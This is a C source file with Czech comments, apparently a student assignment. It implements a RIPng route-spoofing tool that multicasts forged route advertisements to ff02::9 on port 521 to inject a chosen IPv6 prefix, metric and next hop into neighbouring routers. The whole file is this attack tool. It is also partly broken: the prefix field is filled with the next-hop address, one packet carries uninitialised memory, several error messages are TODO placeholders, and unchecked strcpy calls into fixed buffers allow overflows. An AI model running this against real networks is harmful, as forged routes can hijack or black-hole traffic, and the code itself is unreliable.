#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <errno.h>

#define DELKA_RIP_HLAVICKY 4
#define DELKA_ENTRY 20
#define PORT 521

// struktura RIP hlavicky
typedef struct rip_structure {
	uint8_t command;
	uint8_t version;
	uint16_t reserved;
} rip_structure;

// struktura route table entry
typedef struct route_table_entry {
	struct in6_addr ipv6_prefix;
	uint16_t route_tag;
	uint8_t prefix_length;
	uint8_t metric;
} route_table_entry;

// GLOBALNI PROMENNE
// prepinace pro zjisteni, ktery argument byl zadan
int i_argument, r_argument, n_argument, m_argument, t_argument = 0;
char rozhrani[1024]; // rozhrani ziskane z argumentu
char *ipv6_s_maskou = NULL; // IPv6 adresa podvrhavane site ziskana z argumentu
char next_hop_ipv6[1024]; // IPv6 adresa next hopu ziskana z argumentu
int rip_metrika; // metrika ziskana z argumentu
int router_tag; // router rag ziskany z argumentu

// funkce, ktera zkontroluje, zda jsou argumenty zadany spravne a inicializuje promenne
// argumenty mohou byt zadany v libovolnem poradi
// -i -r jsou povinnne
int check_arguments(int argc, char *argv[]) {
	int count = 0; // pocitadlo validnich argumentu
	// projdeme vsechnny argumenty
	for(int i = 1; i < argc; i++) {
		if(strcmp(argv[i], "-i") == 0) {
			i_argument = 1;
			if(argv[i+1] == NULL) {
				fprintf(stderr, "Chyba: Prepinac -i byl zadan bez rozhrani\n");
				return 1;
			}
			strcpy(rozhrani, argv[i+1]);
			count = count + 2;
			i++;
		}
		else if(strcmp(argv[i], "-r") == 0) {
			r_argument = 1;
			if(argv[i+1] == NULL) {
				fprintf(stderr, "Chyba: Prepinac -r byl zadan bez IPv6 adresy\n");
				return 1;
			}
			//strcpy(ipv6_s_maskou, argv[i+1]);
			ipv6_s_maskou = argv[i+1];
			count = count + 2;
			i++;
		}
		else if(strcmp(argv[i], "-n") == 0) {
			n_argument = 1;
			if(argv[i+1] == NULL) {
				fprintf(stderr, "Chyba: Prepinac -n byl zadan bez IPv6 adresy\n");
				return 1;
			}
			strcpy(next_hop_ipv6, argv[i+1]);
			count = count + 2;
			i++;
		}
		else if(strcmp(argv[i], "-m") == 0) {
			m_argument = 1;
			if(argv[i+1] == NULL) {
				fprintf(stderr, "Chyba: Prepinac -m byl zadan bez IPv6 adresy\n");
				return 1;
			}
			rip_metrika = atoi(argv[i+1]);
			count = count + 2;
			i++;
		}
		else if(strcmp(argv[i], "-t") == 0) {
			t_argument = 1;
			if(argv[i+1] == NULL) {
				fprintf(stderr, "Chyba: Prepinac -m byl zadan bez IPv6 adresy\n");
				return 1;
			}
			router_tag = atoi(argv[i+1]);
			count = count + 2;
			i++;
		}
		else {
			fprintf(stderr, "Chyba: Neexistujici parametr\n");
			return 1;
		}
	}
	// zkontrolujeme, jestli nektere argumenty nebyly zadany dvakrat
	if(count+1 != argc) {
		fprintf(stderr, "Chyba: Nektere argumenty jsou zadane navic\n");
		return 1;
	}
	// zkontrolujeme, jestli byly zadany povinne argumenty a inicializujeme promenne na hodnoty, se kterymi budeme dale pracovat
	if(i_argument == 0) {
		fprintf(stderr, "Chyba: Nebylo zadano rozhrani, ze ktereho ma byt utocny paket odeslan\n");
		return 1;
	}
	if(r_argument == 0) {
		fprintf(stderr, "Chyba: Nebyla zadana IP adresa podvrhovane site\n");
		return 1;
	}
	if(m_argument == 0) {
		rip_metrika = 1;	
	} 
	if(n_argument == 0) {
		strcpy(next_hop_ipv6, "::");
	}
	if(t_argument == 0) {
		router_tag = 0;
	}

	return 0;
}

void vypis_argumenty() {
	printf("Rozhrani: %s\n", rozhrani);
	printf("IPv6 adresa: %s\n", ipv6_s_maskou);
	printf("Nexthop: %s\n", next_hop_ipv6);
	printf("RIP metrika: %d\n", rip_metrika);
	printf("Router Tag: %d\n", router_tag);	
}

void ziskani_masky(char *maska, int delka_s_maskou, char *ipv6_s_maskou) {
	// zjistime delku celeho stringu i s maskou
	// iterujeme od 0 a prochazime znak po znaku, dokud nenarazime na '/'
	// pote ulozime do maska_string naseldujici 3 znaky po /
	for(int i = 0; i < delka_s_maskou; i++) {
		if(ipv6_s_maskou[i] == '/') {
			maska[0] = ipv6_s_maskou[i+1];
			maska[1] = ipv6_s_maskou[i+2];
			maska[2] = ipv6_s_maskou[i+3];
			break;
		}
		else {
			continue;
		}
	}
}

/*
*  MAIN
*/
int main(int argc, char *argv[]) {
	printf("-------------------\n");
	// kontrola argumentu
	if(check_arguments(argc, argv) != 0) {
		return 1;
	}
	vypis_argumenty();

	/*
	* -r
	*/
	char maska_string[3];
	int delka_i_s_maskou = strlen(ipv6_s_maskou); // zjistime, kolik znaku obsahuje string adresy i s maskou
	
	// ziskame z celho stringu masku a ulozime do promenne maska_string
	ziskani_masky(maska_string, delka_i_s_maskou, ipv6_s_maskou);

	int maska = atoi(maska_string); // prevedeme string masky na cislo
	int delka_masky = strlen(maska_string); // zjistime kolik cislic obsahuje maska - dve nebo tri

	// maska muze byt pouze v rozsahu 16-128
	if(maska < 16 || maska > 128) {
		fprintf(stderr, "Chyba: Maska musi byt v rozmezi 16-128\n");
		return 1;
	}

	char ipv6_bez_masky[1000];
	// vymazeme masku s lomitkem ze zadane ipv6 adresy
	for(int j = 0; j <= delka_masky; j++) {
		ipv6_s_maskou[delka_i_s_maskou-delka_masky-1+j] = '\0';
	}


	// nyni je promenna ipv6_s_maskou uz bez masky -> prekopirujeme
	strcpy(ipv6_bez_masky, ipv6_s_maskou);

	struct in6_addr adr; // IPv6 adresa
	// prevedem string adresy do binarky -> adr
	if(inet_pton(AF_INET6, ipv6_bez_masky, &adr) != 1) {
		fprintf(stderr, "Neplatna IPv6 adresa\n");
		return 1;
	}
	// z rozhrani ziskame int 
	int index_of_network = if_nametoindex(rozhrani);
	printf("----------\n");
	printf("%s\n", rozhrani);
	printf("%d\n", index_of_network);
	printf("----------\n"); 
	if(index_of_network == errno) {
		fprintf(stderr, "Chyba: Ve funkci if_nametoindex\n");
		return 1;
	}

	// vytvorime si seznam
	struct ifaddrs *iList;
	if(getifaddrs(&iList) != 0) {
		fprintf(stderr, "Chyba: Ve funkci getifaddrs\n");
		return 1;
	}

	// TODO
	struct ifaddrs *iface;
	struct sockaddr_in6* addr;
	char parse[1024];
	char linkAddress[1024];
	for(iface = iList; iface != NULL; iface = iface->ifa_next) {
		if(iface->ifa_addr->sa_family != AF_INET6) {
			continue;
		}
		addr = (struct sockaddr_in6*) iface->ifa_addr;
		inet_ntop(AF_INET6, &addr->sin6_addr, parse, sizeof(parse));
		if(!IN6_IS_ADDR_LINKLOCAL(&(addr->sin6_addr)))
			continue;
		if(strcmp(iface->ifa_name, rozhrani) == 0) {
			strncpy(linkAddress,parse,sizeof(parse));
		}
	}	

	// struct ifaddrs *iface = NULL; // struktura pro jednotlive interface
	// struct sockaddr_in6* addr;
	// char ipv6_text[1000];
	
	// iface = iList;
	// while(iface == NULL) {
	// 	if(iface->ifa_addr->sa_family == AF_INET6) {
	// 		addr = (struct sockaddr_in6*) iface->ifa_addr;
	// 		// prevedeme ipv6 z binarky do textove podoby a vlozime do promenne ipv6_text
	// 		inet_ntop(AF_INET6, &addr->sin6_addr, ipv6_text, sizeof(ipv6_text));
	// 	}
	// 	iface = iface->ifa_next;
	// }

	// vytvorime socket
	int socketID = socket(AF_INET6, SOCK_DGRAM, 0);
	if(socketID == -1) {
		fprintf(stderr, "Chyba: Nepovedlo se vytvorit soket\n");
		return 1;
	}
	else {
		int TTL = 255;
		// nastavime socket
		int set;
		set = setsockopt(socketID, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &TTL, sizeof(TTL));
		if(set == -1) {
			fprintf(stderr, "Chyba: Ve funkci setsockopt\n");
			return 1;
		}
		else {
			set = setsockopt(socketID, IPPROTO_IPV6, IPV6_MULTICAST_IF, &index_of_network, sizeof(index_of_network));
			if(set == -1) {
				fprintf(stderr, "Chyba: Ve funkci setsockopt\n");
				return 1;
			}
		}
	}
	struct sockaddr_in6 tmp;
	//bzero(&tmp, sizeof(tmp));
	tmp.sin6_family = AF_INET6;
	tmp.sin6_port = htons(521);
	tmp.sin6_addr = adr;
	tmp.sin6_scope_id = index_of_network;

	if(bind(socketID, (struct sockaddr*)&tmp, sizeof(tmp)) == -1) {
		printf("...%u\n", index_of_network);
		fprintf(stderr, "Chyba: Ve funkci bind\n");
		return 1;
	}
	else {
		struct sockaddr_in6 sockAddrr;
		//bzero(&sockAddrr, sizeof(sockAddrr));
		sockAddrr.sin6_family = AF_INET6;
		sockAddrr.sin6_port = htons(PORT);
		sockAddrr.sin6_scope_id = index_of_network;

		// nastavime multicast, na ktery budeme posilat utocny paket
		char multicast[] = "ff02::9";
		inet_pton(AF_INET6, multicast, &sockAddrr.sin6_addr);

		int nxt_hop;
		// pokud byl zadan next-hop, budeme posilat i dalsi entry - 20 BYTU
		if(n_argument == 1) {
			nxt_hop = DELKA_ENTRY;
		}
		else {
			nxt_hop = 0;
		}


		u_char *rip; // RIP struktura
		// alokujeme si pro ni potrebnou pamet
		rip = (u_char*)malloc(DELKA_ENTRY + DELKA_RIP_HLAVICKY + nxt_hop);
		
		// RIP hlavicka
		rip_structure rip_hlavicka;
		rip_hlavicka.command = 0x02;
		rip_hlavicka.version = 0x01;
		rip_hlavicka.reserved = 0x0000;
		memcpy(rip, &rip_hlavicka, DELKA_RIP_HLAVICKY);

		if(sendto(socketID, rip, 24/* TODO */, 0, (struct sockaddr *) &sockAddrr, sizeof(sockAddrr)) == -1) {
			fprintf(stderr, "Chyba: TODOO\n");
			return 1;
		}	

		//inet_pton(AF_INET6, "2001:db8:8714:3a90::12/64", &tmp_rte.ipv6_prefix);
		//tmp_rte.ipv6_prefix1 = 0xFFFFFFFFFFFFFFFF;

		struct route_table_entry tmp_rte;
		// pokud je zadan -n parametr
		if(n_argument == 1) {
			inet_pton(AF_INET6, next_hop_ipv6, &tmp_rte.ipv6_prefix); // TODO - pokud se to nepovede, mel by asi vypsat bez next hopu - uvest do dokumentace
			tmp_rte.route_tag = router_tag;
			tmp_rte.prefix_length = maska;
			tmp_rte.metric = rip_metrika;
			memcpy(rip + DELKA_RIP_HLAVICKY, &tmp_rte, DELKA_ENTRY);

			/*  nexthop  */
			tmp_rte.route_tag = 0;
			tmp_rte.prefix_length = 0;
			tmp_rte.metric = 255;
			memcpy(rip + DELKA_RIP_HLAVICKY + DELKA_ENTRY, &tmp_rte, DELKA_ENTRY);
			
			if(sendto(socketID, rip, 44/* TODO */, 0, (struct sockaddr *) &sockAddrr, sizeof(sockAddrr)) == -1) {
				fprintf(stderr, "Chyba: TODOO\n");
				return 1;
			}	
		}
		else {
			inet_pton(AF_INET6, next_hop_ipv6, &tmp_rte.ipv6_prefix); // TODO - pokud se to nepovede, mel by asi vypsat bez next hopu - uvest do dokumentace
			tmp_rte.route_tag = router_tag;
			tmp_rte.prefix_length = maska;
			tmp_rte.metric = rip_metrika;
			memcpy(rip + DELKA_RIP_HLAVICKY, &tmp_rte, DELKA_ENTRY);
			if(sendto(socketID, rip, 24/* TODO */, 0, (struct sockaddr *) &sockAddrr, sizeof(sockAddrr)) == -1) {
				fprintf(stderr, "Chyba: TODOO\n");
				return 1;
			}			
		}
	}

	return 0;
}